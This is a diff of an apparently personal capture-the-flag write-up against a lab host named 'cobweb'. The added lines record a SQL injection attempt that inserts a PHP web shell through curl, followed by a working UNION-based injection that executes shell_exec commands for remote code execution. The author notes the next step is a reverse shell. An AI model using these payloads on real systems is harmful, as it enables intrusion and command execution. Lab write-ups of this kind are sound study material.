@@ -95,6 +95,7 @@ access.log:
 192.168.118.5 - - [27/Aug/2021:08:47:23 -0400] "POST / HTTP/1.1" 401 5422 "http://192.168.120.61/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
 
 ```
+## Non-root access
 
 Hmm, `/.index.php.swp`...
 
@@ -322,14 +323,33 @@ Nope, this fails too.
 
 
 ```
-curl "http://192.168.53.162/%22%20%3B%20INSERT%20INTO%20webpages%20%28route_string%2C%20page_data%29%20VALUES%20%28%27owned%27%2C%20%27%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%27%29%3B%20--%20-"
+curl "http://cobweb/%22%20%3B%20INSERT%20INTO%20webpages%20%28route_string%2C%20page_data%29%20VALUES%20%28%27owned%27%2C%20%27%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%27%29%3B%20--%20-"
 
 curl http://cobweb/owned?cmd=ls
 ```
 
 Fails.
 
-## Non-root access
+Okay, apparently it's vulnerable to UNION.
+
+```sh
+# Yes, you need to curl. Vulnerable to union
+
+" AND 1=2 UNION SELECT 'echo shell_exec("id");'-- 
+
+curl "http://cobweb/%22%20AND%201=2%20UNION%20SELECT%20%27echo%20shell_exec(%22id%22);%27--%20" 
+
+"
+
+# " AND 1=2 UNION SELECT 'echo shell_exec("id");'-- 
+
+```
+
+![](Pasted%20image%2020260425162801.png)
+
+Okay! We have RCE that works reliably. Now to get a reverse shell.
+
+
 
 
 
